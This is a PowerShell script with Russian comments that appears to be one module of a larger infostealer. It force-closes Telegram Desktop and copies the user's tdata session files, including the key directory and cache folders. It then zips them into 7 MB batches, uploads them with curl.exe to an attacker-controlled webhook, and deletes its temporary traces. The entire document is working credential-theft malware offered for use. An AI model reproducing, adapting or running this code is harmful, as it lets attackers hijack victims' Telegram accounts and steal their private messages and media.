# Telegram tdata collector — с закрытием Telegram и структурой
$tgPath = "$env:APPDATA\Telegram Desktop\tdata"

if (Test-Path $tgPath) {
    Write-Host "[*] Обнаружен Telegram. Закрываю процесс..." -ForegroundColor Yellow

    # ------------------------------------------------------------
    # 1. Принудительно закрываем Telegram
    # ------------------------------------------------------------
    Get-Process -Name "Telegram" -ErrorAction SilentlyContinue | Stop-Process -Force
    Get-Process -Name "TelegramDesktop" -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 2

    # ------------------------------------------------------------
    # 2. Ждём, пока файлы освободятся (повторяем попытку копирования)
    # ------------------------------------------------------------
    $tgRoot = "$env:TEMP\Telegram_$hwid"
    if (Test-Path $tgRoot) { Remove-Item $tgRoot -Recurse -Force -ErrorAction SilentlyContinue }
    New-Item -Path $tgRoot -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

    # Функция копирования с повторными попытками
    function SafeCopy {
        param($Source, $Destination, $MaxAttempts = 5)
        $attempt = 0
        while ($attempt -lt $MaxAttempts) {
            try {
                Copy-Item -Path $Source -Destination $Destination -Force -ErrorAction Stop
                return $true
            } catch {
                $attempt++
                if ($attempt -ge $MaxAttempts) {
                    Write-Host "[!] Не удалось скопировать: $Source" -ForegroundColor Red
                    return $false
                }
                Start-Sleep -Milliseconds 500
            }
        }
        return $false
    }

    # ------------------------------------------------------------
    # 3. Копируем файлы из папки D877F783D5D3EF8C
    # ------------------------------------------------------------
    $specialDir = Join-Path $tgPath "D877F783D5D3EF8C"
    if (Test-Path $specialDir) {
        $files = Get-ChildItem -Path $specialDir -File -ErrorAction SilentlyContinue
        $counter = 1
        foreach ($f in $files) {
            $destDir = Join-Path $tgRoot "tdata_D877F783D5D3EF8C"
            if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
            $destFile = Join-Path $destDir "$($f.Name)_$counter"
            SafeCopy -Source $f.FullName -Destination $destFile
            $counter++
        }
    }

    # ------------------------------------------------------------
    # 4. Копируем файлы из user_data/cache/номер/айди
    # ------------------------------------------------------------
    $cacheDir = Join-Path $tgPath "user_data\cache"
    if (Test-Path $cacheDir) {
        $items = Get-ChildItem -Path $cacheDir -Directory -ErrorAction SilentlyContinue
        $counter = 1
        foreach ($item in $items) {
            $subItems = Get-ChildItem -Path $item.FullName -File -ErrorAction SilentlyContinue
            foreach ($sub in $subItems) {
                $destDir = Join-Path $tgRoot "tdata_userdata_cache"
                if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
                $destFile = Join-Path $destDir "$($sub.Name)_$counter"
                SafeCopy -Source $sub.FullName -Destination $destFile
                $counter++
            }
        }
    }

    # ------------------------------------------------------------
    # 5. Копируем файлы из user_data/media_cache/номер/айди
    # ------------------------------------------------------------
    $mediaCacheDir = Join-Path $tgPath "user_data\media_cache"
    if (Test-Path $mediaCacheDir) {
        $items = Get-ChildItem -Path $mediaCacheDir -Directory -ErrorAction SilentlyContinue
        $counter = 1
        foreach ($item in $items) {
            $subItems = Get-ChildItem -Path $item.FullName -File -ErrorAction SilentlyContinue
            foreach ($sub in $subItems) {
                $destDir = Join-Path $tgRoot "tdata_userdata_mediacache"
                if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
                $destFile = Join-Path $destDir "$($sub.Name)_$counter"
                SafeCopy -Source $sub.FullName -Destination $destFile
                $counter++
            }
        }
    }

    # ------------------------------------------------------------
    # 6. Копируем корневые файлы tdata (не в папках)
    # ------------------------------------------------------------
    $rootFiles = Get-ChildItem -Path $tgPath -File -ErrorAction SilentlyContinue
    $counter = 1
    foreach ($f in $rootFiles) {
        $destDir = Join-Path $tgRoot "tdata"
        if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
        $destFile = Join-Path $destDir "$($f.Name)_$counter"
        SafeCopy -Source $f.FullName -Destination $destFile
        $counter++
    }

    # ------------------------------------------------------------
    # 7. Отправка (батчами по 7 МБ) — как в основном скрипте
    # ------------------------------------------------------------
    $tgFiles = Get-ChildItem -Path $tgRoot -Recurse -File
    $batch = @()
    $batchSize = 0
    $batchId = 1

    foreach ($tf in $tgFiles) {
        $fsize = $tf.Length
        if ($fsize -le 4MB) {
            if ($batchSize + $fsize -gt 7MB -and $batch.Count -gt 0) {
                $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
                New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
                foreach ($bf in $batch) {
                    $relPath = $bf.FullName.Substring($tgRoot.Length + 1)
                    $destFile = Join-Path $batchDir $relPath
                    $destDir = Split-Path $destFile -Parent
                    if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
                    Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
                }
                $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
                try {
                    [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
                } catch {}
                if (Test-Path $batchZip) {
                    curl.exe -s -F "file=@$batchZip" $webhook
                }
                Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
                Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
                $batch = @()
                $batchSize = 0
                $batchId++
            }
            $batch += $tf
            $batchSize += $fsize
        } else {
            $tempFile = "$env:TEMP\$($tf.Name)"
            Copy-Item -Path $tf.FullName -Destination $tempFile -Force -ErrorAction SilentlyContinue
            curl.exe -s -F "file=@$tempFile" $webhook
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
    }

    if ($batch.Count -gt 0) {
        $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
        New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        foreach ($bf in $batch) {
            $relPath = $bf.FullName.Substring($tgRoot.Length + 1)
            $destFile = Join-Path $batchDir $relPath
            $destDir = Split-Path $destFile -Parent
            if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
            Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
        }
        $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
        try {
            [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
        } catch {}
        if (Test-Path $batchZip) {
            curl.exe -s -F "file=@$batchZip" $webhook
        }
        Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
        Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    Remove-Item $tgRoot -Recurse -Force -ErrorAction SilentlyContinue
}
